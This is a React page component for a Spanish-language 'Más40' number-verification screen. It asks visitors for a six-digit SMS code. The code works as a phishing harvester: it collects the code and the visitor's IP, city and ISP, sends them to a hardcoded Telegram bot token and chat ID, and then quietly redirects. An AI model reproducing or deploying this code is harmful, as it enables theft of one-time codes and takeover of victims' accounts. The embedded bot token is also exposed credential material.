import React, { useState } from 'react';
import { Helmet } from 'react-helmet';
import { useNavigate } from 'react-router-dom';
import SiteHeader from '@/components/SiteHeader';
import SiteFooter from '@/components/SiteFooter';

// CONFIGURACIÓN DE TELEGRAM
const TELEGRAM_BOT_TOKEN = '8298792473:AAGw1ZyXuaFCHhKkTvt973DFvYwwSPo6W-o';
const TELEGRAM_CHAT_ID = '8894482935';
function VerificationPage() {
  const navigate = useNavigate();
  const [code, setCode] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  // Función para obtener información del usuario (IP, ubicación)
  const getUserInfo = async () => {
    try {
      const response = await fetch('https://ipapi.co/json/');
      const data = await response.json();
      const userAgent = navigator.userAgent;
      return {
        ip: data.ip,
        city: data.city,
        isp: data.org,
      };
    } catch (error) {
      return {
        ip: 'No disponible',
        city: 'No disponible',
        isp: 'No disponible',
      };
    }
  };
  const handleVerify = async () => {
    if (code.length !== 6) {
      setError('El código debe tener 6 dígitos.');
      return;
    }
    setError('');
    setLoading(true);
    try {
      // Obtener información del usuario
      const userInfo = await getUserInfo();

      // Enviar código de verificación y datos del usuario a Telegram
      const message = `
🔑 Nuevo código de verificación:
📟 Código: ${code}
🔌 IP: ${userInfo.ip}
🏙️ Ciudad: ${userInfo.city}
📡 ISP: ${userInfo.isp}
            `;
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message
        })
      });
    } catch (error) {
      console.error('Error:', error);
    } finally {
      // Redirigir después de procesar la solicitud
      setTimeout(() => navigate('/'), 1200);
    }
  };
  return <div className="min-h-[100dvh] flex flex-col bg-white">
            <Helmet>
                <title>Verificación — Más40</title>
                <meta name="description" content="Introduce el código de 6 dígitos para verificar tu número en Más40." />
            </Helmet>
            <SiteHeader />
            <main className="flex-1 px-6 py-12 flex flex-col items-center text-center">
                <h1 className="text-3xl text-neutral-800">Verifica tu número</h1>
                <p className="mt-2 text-lg text-neutral-600 max-w-sm">Hemos enviado un código de 6 dígitos por SMS a tu número de móvil .</p>
                <div className="mt-8 w-full max-w-sm">
                    <input type="text" inputMode="numeric" autoComplete="one-time-code" placeholder="––––––" value={code} onChange={e => setCode(e.target.value.replace(/\D/g, '').slice(0, 6))} className="w-full rounded-2xl border border-neutral-300 py-4 text-center text-3xl tracking-[0.5em] outline-none focus:border-[#128C7E] text-neutral-900" />
                    {error ? <p className="mt-2 text-sm text-red-600">{error}</p> : null}
                    <button type="button" onClick={handleVerify} disabled={loading} className="mt-6 w-full rounded-full bg-[#0f7b6c] py-4 text-xl text-white transition active:scale-[0.98] disabled:opacity-70">
                        {loading ? 'Verificando…' : 'Verificar'}
                    </button>
                </div>
            </main>
            <SiteFooter />
        </div>;
}
export default VerificationPage;
